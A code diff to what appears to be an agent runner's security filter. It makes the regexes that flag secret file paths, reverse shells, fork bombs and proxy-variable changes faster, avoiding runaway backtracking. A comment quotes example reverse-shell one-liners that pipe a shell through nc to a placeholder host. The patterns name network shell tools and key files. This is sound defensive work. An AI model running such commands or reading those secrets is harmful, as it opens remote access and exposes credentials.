@@ -434,10 +434,11 @@ const SYSTEM_SECRETS = [
 
 /**
  * Secrets a read never gets: keys, tokens, env files (not their `.env.example`
- * and the like, which hold none), the runner's own home.
+ * and the like, which hold none), the runner's own home. A key's name is its last part (`[^/]*\.pem`): `.*` would
+ * scan from every `/` of a long word to its end.
  */
 const SECRET_PATH = new RegExp(
-  `(^|/)(${SECRET_DIRS.map(escapeRe).join("|")})(/|$)|^~/(${HOME_SECRET_DIRS.map(escapeRe).join("|")})(/|$)|(^|/)(${SECRET_FILES.map(escapeRe).join("|")}|\\.env(\\.(?!(example|sample|template|dist|defaults)$)[\\w.-]+)?|id_[a-z0-9]+(\\.pub)?|.*\\.pem|.*\\.key)$|(^|/)(${SECRET_SIGN_IN_FILES.map((f) => escapeRe(f).replaceAll("\\*", "[^/]+")).join("|")})$|${SYSTEM_SECRETS.join("|")}`,
+  `(^|/)(${SECRET_DIRS.map(escapeRe).join("|")})(/|$)|^~/(${HOME_SECRET_DIRS.map(escapeRe).join("|")})(/|$)|(^|/)(${SECRET_FILES.map(escapeRe).join("|")}|\\.env(\\.(?!(example|sample|template|dist|defaults)$)[\\w.-]+)?|id_[a-z0-9]+(\\.pub)?|[^/]*\\.pem|[^/]*\\.key)$|(^|/)(${SECRET_SIGN_IN_FILES.map((f) => escapeRe(f).replaceAll("\\*", "[^/]+")).join("|")})$|${SYSTEM_SECRETS.join("|")}`,
   "i",
 );
 
@@ -2219,8 +2220,9 @@ const REVERSE_SHELL: ReadonlyArray<readonly RegExp[]> = [
   [/\/dev\/(tcp|udp)\//i],
   [/\/inet6?\/(tcp|udp)\//],
   // `cat /tmp/f | sh -i 2>&1 | nc host 4444 > /tmp/f`, `nc host 4444 < f | bash > f`: a shell reading a network tool.
+  // A shell's path stops at the shell's operators: run over them, each `(` of minified code would scan to its end.
   [
-    /\b(ba|z|da|k)?sh\s+-i\b|\|\s*(\S*\/)?(ba|z|da|k)?sh\b(\s+-[is]\b)?\s*($|[|<>&;\d])|(^|[;&|(]\s*)(\S*\/)?(ba|z|da|k)?sh\s*</m,
+    /\b(ba|z|da|k)?sh\s+-i\b|\|\s*([^\s|;&<>()]*\/)?(ba|z|da|k)?sh\b(\s+-[is]\b)?\s*($|[|<>&;\d])|(^|[;&|(]\s*)([^\s|;&<>()]*\/)?(ba|z|da|k)?sh\s*</m,
     /\b(nc|ncat|netcat|telnet|socat)\b|\bopenssl\s+s_client\b/,
   ],
   [/\bsocket\b/, /\bpty\.spawn\b|\bos\.dup2\b|\bdup2\s*\(/],
@@ -2255,7 +2257,8 @@ const ENCODED_RUN: ReadonlyArray<readonly RegExp[]> = [
  */
 const RUNNER_VARIABLE =
   /(\$\{?|\$env:|%|environ\s*\[\s*["']|environ\.get\(\s*["']|getenv\(\s*["']|getenvironmentvariable\(\s*["']|process\.env\.|process\.env\[\s*["']|ENV\[\s*["'])AGENTES_(RUNNER_HOME|MCP_TOKEN|MCP_SOCKET)\b/i;
-const FORK_BOMB = /([\w:]+)\s*\(\s*\)\s*\{\s*\1\s*\|\s*\1\s*&/;
+/** A name that starts a word: without the lookbehind every letter of a long word starts a scan to its end. */
+const FORK_BOMB = /(?<![\w:])([\w:]+)\s*\(\s*\)\s*\{\s*\1\s*\|\s*\1\s*&/;
 /** The proxy variables set, emptied or dropped, in a shell or in code (`HTTPS_PROXY= curl`, `del os.environ["NO_PROXY"]`). */
 const PROXY_TEXT: readonly RegExp[] = [
   /(^|\W)(https?|all|ftp|socks)_proxy["'\]]*\s*=(?!=)/i,
